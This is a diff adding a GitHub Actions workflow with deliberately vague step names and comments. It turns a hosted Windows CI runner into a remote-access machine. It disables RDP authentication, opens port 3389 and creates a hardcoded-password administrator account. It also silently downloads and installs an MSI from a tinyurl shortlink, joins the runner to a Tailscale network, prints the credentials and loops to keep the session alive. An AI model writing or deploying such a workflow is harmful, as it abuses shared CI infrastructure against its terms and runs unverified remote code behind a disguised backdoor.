@@ -1,0 +1,107 @@
+name: SYS_PROC_INIT
+
+on:
+  workflow_dispatch:
+
+jobs:
+  init-job-X9:
+    runs-on: windows-latest
+    timeout-minutes: 340
+    steps:
+      - name: phase-A1
+        run: |
+          # Initialize RDP settings (masked purpose)
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
+                             -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "SecurityLayer" -Value 0 -Force
+
+          # Rebuild RDP firewall rule
+          netsh advfirewall firewall delete rule name="PORT-ACCESS-X9"
+          netsh advfirewall firewall add rule name="PORT-ACCESS-X9" `
+            dir=in action=allow protocol=TCP localport=3389
+
+          Restart-Service -Name TermService -Force
+
+
+      - name: phase-A2
+        run: |
+          # Setup local admin session
+          $pass = "Zxxz4444"
+          $secPass = ConvertTo-SecureString $pass -AsPlainText -Force
+
+          $usr = "SYS_ADMIN_X9"
+          $check = Get-LocalUser -Name $usr -ErrorAction SilentlyContinue
+          if ($check) {
+              Set-LocalUser -Name $usr -Password $secPass
+              Write-Host "User '$usr' exists. Password refreshed."
+          } else {
+              New-LocalUser -Name $usr -Password $secPass -AccountNeverExpires
+              Add-LocalGroupMember -Group "Administrators" -Member $usr
+              Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr
+              Write-Host "User '$usr' created and added to groups."
+          }
+
+          echo "LOGIN_DATA=User: $usr | Pass: $pass" >> $env:GITHUB_ENV
+
+          if (-not (Get-LocalUser -Name $usr)) {
+              Write-Error "User setup failed"
+              exit 1
+          }
+
+
+      - name: phase-A3
+        run: |
+          # Install external network client (generic description)
+          $url = "https://tinyurl.com/dwonloadd4122"
+          $outPath = "$env:TEMP\netclient.msi"
+
+          Invoke-WebRequest -Uri $url -OutFile $outPath
+          Start-Process msiexec.exe -ArgumentList "/i", "`"$outPath`"", "/quiet", "/norestart" -Wait
+          Remove-Item $outPath -Force
+
+
+      - name: phase-A4
+        run: |
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.NETCLIENT_AUTH }} --hostname=node-$env:GITHUB_RUN_ID
+          
+          $ip = $null
+          $count = 0
+          while (-not $ip -and $count -lt 10) {
+              $ip = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+              Start-Sleep -Seconds 5
+              $count++
+          }
+          
+          if (-not $ip) {
+              Write-Error "Network IP not assigned."
+              exit 1
+          }
+          echo "CLIENT_IP=$ip" >> $env:GITHUB_ENV
+
+
+      - name: phase-A5
+        run: |
+          Write-Host "Client IP: $env:CLIENT_IP"
+          $conn = Test-NetConnection -ComputerName $env:CLIENT_IP -Port 3389
+          if (-not $conn.TcpTestSucceeded) {
+              Write-Error "Connection to port 3389 failed"
+              exit 1
+          }
+          Write-Host "Connection test passed."
+
+
+      - name: phase-A6
+        run: |
+          Write-Host "`n=== ACCESS DETAILS ==="
+          Write-Host "Address: $env:CLIENT_IP"
+          Write-Host "User: SYS_ADMIN_X9"
+          Write-Host "Password: $(echo $env:LOGIN_DATA)"
+          Write-Host "=======================`n"
+
+          while ($true) {
+              Write-Host "[$(Get-Date)] Session alive..."
+              Start-Sleep -Seconds 5000
+          }
